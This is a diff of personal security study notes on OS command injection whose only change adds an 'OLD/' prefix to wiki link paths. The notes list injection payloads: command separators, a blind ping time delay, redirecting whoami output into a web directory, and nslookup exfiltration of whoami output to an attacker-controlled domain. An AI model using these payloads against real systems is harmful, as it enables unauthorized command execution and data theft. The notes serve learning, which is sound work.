@@ -31,7 +31,7 @@
 
 ## Basic
 
-- Use command seprators + command to retrive data. [[WEB/vulnerabilities/Command Injection/payload#basic|example]]
+- Use command seprators + command to retrive data. [[OLD/WEB/vulnerabilities/Command Injection/payload#basic|example]]
 
 # Blind 
 
@@ -39,14 +39,14 @@
 ## by using time delays
 
 - _ping_ command 
-	- ex:  `& ping -c 10 127.0.0.1 &` [[WEB/vulnerabilities/Command Injection/payload#using time delays|payload]]
+	- ex:  `& ping -c 10 127.0.0.1 &` [[OLD/WEB/vulnerabilities/Command Injection/payload#using time delays|payload]]
 ## by redirecting output
 
 - `>` , `>>`
-	- ex: `& whoami > /var/www/static/whoami.txt &` [[WEB/vulnerabilities/Command Injection/payload#by redirecting output|payload]]
+	- ex: `& whoami > /var/www/static/whoami.txt &` [[OLD/WEB/vulnerabilities/Command Injection/payload#by redirecting output|payload]]
 
 ## by using out-of-band (OAST)
 
-- *`nslookup`* + inline execution+ a *domain* which the attacker controls: [[WEB/vulnerabilities/Command Injection/payload#by using out-of-band (OAST)|payload]]
+- *`nslookup`* + inline execution+ a *domain* which the attacker controls: [[OLD/WEB/vulnerabilities/Command Injection/payload#by using out-of-band (OAST)|payload]]
 	- ex: `& nslookup kgji2ohoyw.web-attacker.com &`
 	- ex: ``& nslookup `whoami`.kgji2ohoyw.web-attacker.com &`` => `wwwuser.kgji2ohoyw.web-attacker.com`
